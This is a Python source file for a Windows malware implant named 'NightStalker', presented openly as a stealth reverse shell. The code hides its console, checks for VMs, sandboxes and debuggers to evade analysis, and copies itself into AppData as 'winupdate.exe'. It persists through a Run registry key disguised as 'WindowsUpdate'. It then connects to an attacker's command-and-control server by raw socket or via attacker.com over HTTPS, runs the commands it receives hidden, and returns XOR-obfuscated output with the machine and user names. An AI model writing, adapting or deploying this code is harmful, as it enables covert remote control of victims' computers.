#!/usr/bin/env python3
"""
NightStalker - Stealth Reverse Shell Payload
Advanced persistent reverse shell with anti-detection and encryption
"""

import os
import sys
import socket
import base64
import time
import random
import subprocess
import ctypes
import threading
from ctypes import wintypes
import winreg

# ============================================================================
# CONFIGURATION SECTION - EDIT THESE VALUES
# ============================================================================
LHOST = "192.168.1.100"          # C2 Server IP
LPORT = 4444                     # C2 Server Port
PAYLOAD_NAME = "winupdate.exe"   # Name for the copied payload
REG_KEY_NAME = "WindowsUpdate"   # Registry key name for persistence
ENCRYPTION_KEY = "NightStalker2024!"  # AES encryption key (16, 24, or 32 bytes)
USE_HTTPS = False                # Use HTTPS instead of raw socket
C2_URL = "https://attacker.com/shell"  # HTTPS C2 URL (if USE_HTTPS=True)
# ============================================================================

class StealthReverseShell:
    def __init__(self):
        self.encryption_key = ENCRYPTION_KEY.encode()
        self.running = True
        self.reconnect_delay = 10
        
    def log(self, message):
        """Silent logging - can be enabled for debugging"""
        # Uncomment the line below for debugging
        # with open("C:\\temp\\debug.log", "a") as f: f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
        pass
    
    def encrypt_data(self, data):
        """Simple XOR encryption for communication"""
        if isinstance(data, str):
            data = data.encode()
        
        encrypted = bytearray()
        for i, byte in enumerate(data):
            key_byte = self.encryption_key[i % len(self.encryption_key)]
            encrypted.append(byte ^ key_byte)
        
        return base64.b64encode(encrypted).decode()
    
    def decrypt_data(self, data):
        """Decrypt XOR encrypted data"""
        try:
            encrypted = base64.b64decode(data)
            decrypted = bytearray()
            for i, byte in enumerate(encrypted):
                key_byte = self.encryption_key[i % len(self.encryption_key)]
                decrypted.append(byte ^ key_byte)
            return decrypted.decode()
        except:
            return data
    
    def check_vm_sandbox(self):
        """Basic VM/Sandbox detection"""
        try:
            # Check CPU cores
            cpu_count = os.cpu_count()
            if cpu_count and cpu_count < 2:
                self.log("VM detected: Low CPU core count")
                return True
            
            # Sleep timing check
            start_time = time.time()
            time.sleep(1)
            elapsed = time.time() - start_time
            if elapsed > 1.5:  # Sandbox often has timing issues
                self.log("Sandbox detected: Sleep timing discrepancy")
                return True
            
            # Check for common VM MAC addresses
            try:
                result = subprocess.run("ipconfig /all", shell=True, capture_output=True, text=True)
                output = result.stdout.lower()
                vm_indicators = [
                    "vmware", "virtualbox", "vbox", "qemu", "xen",
                    "00:05:69", "00:0c:29", "00:1c:14", "08:00:27"
                ]
                for indicator in vm_indicators:
                    if indicator in output:
                        self.log(f"VM detected: {indicator}")
                        return True
            except:
                pass
            
            # Check for debugger
            if ctypes.windll.kernel32.IsDebuggerPresent():
                self.log("Debugger detected")
                return True
                
            return False
            
        except Exception as e:
            self.log(f"VM check error: {e}")
            return False
    
    def copy_to_persistence_location(self):
        """Copy payload to AppData with system-looking name"""
        try:
            current_path = sys.argv[0]
            if current_path.endswith('.py'):
                # If running as script, use current directory
                current_path = os.path.abspath(__file__)
            
            # Choose persistence location
            locations = [
                os.path.join(os.environ.get('APPDATA', ''), PAYLOAD_NAME),
                os.path.join(os.environ.get('TEMP', ''), PAYLOAD_NAME),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), PAYLOAD_NAME)
            ]
            
            target_path = None
            for location in locations:
                if os.path.exists(os.path.dirname(location)):
                    target_path = location
                    break
            
            if not target_path:
                return False
            
            # Copy file if not already there
            if not os.path.exists(target_path) or os.path.abspath(current_path) != os.path.abspath(target_path):
                import shutil
                shutil.copy2(current_path, target_path)
                self.log(f"Copied to: {target_path}")
            
            return target_path
            
        except Exception as e:
            self.log(f"Copy error: {e}")
            return False
    
    def setup_persistence(self, payload_path):
        """Set up registry persistence"""
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, payload_path)
            winreg.CloseKey(key)
            self.log(f"Persistence set: {REG_KEY_NAME}")
            return True
        except Exception as e:
            self.log(f"Persistence error: {e}")
            return False
    
    def execute_command(self, command):
        """Execute command and return output"""
        try:
            # Hide console window
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                startupinfo=startupinfo,
                timeout=30
            )
            
            output = result.stdout + result.stderr
            return output if output else "Command executed successfully"
            
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def socket_communication(self):
        """Raw socket communication with C2"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((LHOST, LPORT))
                self.log("Connected to C2 server")
                
                while self.running:
                    try:
                        # Receive command
                        data = sock.recv(4096)
                        if not data:
                            break
                        
                        command = self.decrypt_data(data.decode())
                        if command.lower() in ['exit', 'quit']:
                            self.running = False
                            break
                        
                        # Execute command
                        output = self.execute_command(command)
                        
                        # Send result
                        encrypted_output = self.encrypt_data(output)
                        sock.send(encrypted_output.encode())
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        self.log(f"Socket error: {e}")
                        break
                
                sock.close()
                
            except Exception as e:
                self.log(f"Connection error: {e}")
            
            # Reconnect with jitter
            if self.running:
                jitter = random.randint(10, 30)
                time.sleep(jitter)
    
    def https_communication(self):
        """HTTPS communication with C2"""
        try:
            import urllib.request
            import urllib.parse
        except ImportError:
            self.log("HTTPS communication not available")
            return
        
        while self.running:
            try:
                # Send beacon
                data = {
                    'id': os.environ.get('COMPUTERNAME', 'unknown'),
                    'user': os.environ.get('USERNAME', 'unknown'),
                    'status': 'ready'
                }
                
                encoded_data = urllib.parse.urlencode(data).encode()
                req = urllib.request.Request(C2_URL, data=encoded_data)
                response = urllib.request.urlopen(req, timeout=10)
                
                command = response.read().decode().strip()
                if command:
                    command = self.decrypt_data(command)
                    if command.lower() in ['exit', 'quit']:
                        self.running = False
                        break
                    
                    output = self.execute_command(command)
                    encrypted_output = self.encrypt_data(output)
                    
                    # Send result
                    result_data = {'result': encrypted_output}
                    encoded_result = urllib.parse.urlencode(result_data).encode()
                    req = urllib.request.Request(C2_URL, data=encoded_result)
                    urllib.request.urlopen(req, timeout=10)
                
            except Exception as e:
                self.log(f"HTTPS error: {e}")
            
            # Reconnect with jitter
            if self.running:
                jitter = random.randint(10, 30)
                time.sleep(jitter)
    
    def hide_console(self):
        """Hide console window"""
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
        except:
            pass
    
    def run(self):
        """Main execution function"""
        try:
            # Hide console
            self.hide_console()
            
            # VM/Sandbox detection
            if self.check_vm_sandbox():
                self.log("VM/Sandbox detected - exiting")
                return
            
            # Copy to persistence location
            payload_path = self.copy_to_persistence_location()
            if payload_path:
                self.setup_persistence(payload_path)
            
            # Start communication
            if USE_HTTPS:
                self.https_communication()
            else:
                self.socket_communication()
                
        except KeyboardInterrupt:
            self.running = False
        except Exception as e:
            self.log(f"Main error: {e}")

def main():
    """Entry point"""
    payload = StealthReverseShell()
    payload.run()

if __name__ == "__main__":
    main() 